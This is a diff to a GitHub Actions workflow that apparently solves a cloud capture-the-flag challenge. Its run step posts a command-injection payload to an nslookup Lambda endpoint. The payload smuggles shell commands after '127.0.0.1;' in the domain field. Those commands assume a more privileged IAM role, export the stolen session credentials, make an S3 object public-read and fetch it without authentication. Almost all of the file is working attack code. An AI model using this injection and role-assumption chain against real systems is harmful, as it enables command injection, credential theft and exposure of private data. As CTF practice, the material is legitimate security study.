@@ -19,17 +19,20 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
-
+      - name: Make flag.txt public via assumed role
         run: |
-
           API_ID="3q931syi7b"
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
     
-          # If assume-role succeeds, sleep 8s. If it fails, it exits immediately.
-          PAYLOAD='{"domain": "127.0.0.1; aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name lo-test && sleep 8"}'
+          # Assume CTFExecutionRole, then make the specific object public-read
+          PAYLOAD='{"domain": "127.0.0.1; CREDS=$(aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name lo); export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .Credentials.AccessKeyId); export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .Credentials.SecretAccessKey); export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Credentials.SessionToken); aws s3api put-object-acl --bucket codec4f26c862a321ef5 --key flag.txt --acl public-read --region us-east-1"}'
     
-           time curl -s -X POST "$URL" \
-           -H "Content-Type: application/json" \
-           -d "$PAYLOAD"
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
+    
+          sleep 3
+    
+          # Download via unauthenticated HTTP (bypassing cicdRole S3 restrictions)
+          curl -s https://codec4f26c862a321ef5.s3.amazonaws.com/flag.txt
